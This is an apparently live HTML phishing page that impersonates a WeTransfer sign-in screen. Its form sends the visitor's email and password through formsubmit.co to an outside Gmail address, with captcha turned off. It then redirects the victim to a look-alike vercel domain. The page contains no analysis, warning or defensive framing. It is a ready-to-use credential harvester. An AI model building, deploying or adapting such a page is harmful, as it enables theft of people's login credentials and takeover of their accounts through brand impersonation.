<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Wetransfer</title>

<link href="[fonts.googleapis.com](https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap)" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Poppins',sans-serif;
}

body{
  background:#f4f4f4;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:20px;
}

.wrapper{
  width:100%;
  max-width:480px;
  background:#f4f4f4;
  text-align:center;
}

.logo{
  font-size:clamp(42px, 7vw, 70px);
  font-weight:700;
  color:#000;
  margin-bottom:60px;
  line-height:1;
}

.title{
  font-size:clamp(22px, 5vw, 30px);
  font-weight:600;
  color:#000;
  margin-bottom:12px;
}

.subtitle{
  font-size:clamp(5px, 2vw, 7px);
  color:#222;
  margin-bottom:40px;
  line-height:1.5;
}

.input-group{
  margin-bottom:22px;
}

.input-group input{
  width:100%;
  padding:22px 24px;
  border:2px solid #d9d9d9;
  border-radius:24px;
  background:#fff;
  font-size:20px;
  outline:none;
  transition:0.3s ease;
}

.input-group input:focus{
  border-color:#3567f2;
  box-shadow:0 0 10px rgba(53,103,242,0.15);
}

.btn{
  width:100%;
  padding:22px;
  border:none;
  border-radius:24px;
  background:#3567f2;
  color:#fff;
  font-size:28px;
  font-weight:500;
  cursor:pointer;
  transition:0.3s ease;
  margin-top:5px;
}

.btn:hover{
  background:#2957d8;
}

.links{
  margin-top:45px;
}

.links a{
  display:block;
  margin:18px 0;
  color:#222;
  font-size:20px;
  text-decoration:underline;
}

.divider{
  display:flex;
  align-items:center;
  margin:45px 0;
  color:#999;
  font-size:22px;
}

.divider::before,
.divider::after{
  content:"";
  flex:1;
  height:1px;
  background:#ccc;
}

.divider span{
  margin:0 15px;
}

.bottom-text{
  font-size:20px;
  color:#222;
}

.bottom-text a{
  color:#222;
  text-decoration:underline;
}

/* MOBILE VIEW */
@media(max-width:168px){
  .btn{
    font-size:14px;
    padding:12px;
    border-radius:10px;
  }
}

/* SMALL MOBILE VIEW */
@media(max-width:100px){
  body{ padding:15px; }
  .logo{ font-size:20px; }
  .title{ font-size:9px; }
  .subtitle{ font-size:10px; }
  .input-group input{
    padding:11px;
    font-size:10px;
  }
  .btn{
    font-size:12px;
    padding:10px;
  }
}
</style>
</head>
<body>

<div class="wrapper">

  <img src="logo.08he3n6vuv2qc (1).svg">
  <div class="title">Sign In</div>
  <div class="subtitle">to continue to your WeTransfer account.</div>

  <!-- ✅ FormSubmit Integration -->
  <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">


    <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
    <input type="hidden" name="_captcha" value="false">

    <div class="input-group">
      <input type="email" name="email" placeholder="Enter email" required>
    </div>

    <div class="input-group">
      <input type="password" name="password" placeholder="Type your password..." required>
    </div>

    <button type="submit" class="btn">Continue</button>
  </form>

  <div class="links">
    <a href="#">Forgot password?</a>
    <a href="#">Use a different email?</a>
  </div>

  <div class="divider"><span>or</span></div>

  <div class="bottom-text">
    Receive a <a href="#">temporary code via email</a>
  </div>

</div>

</body>
</html>
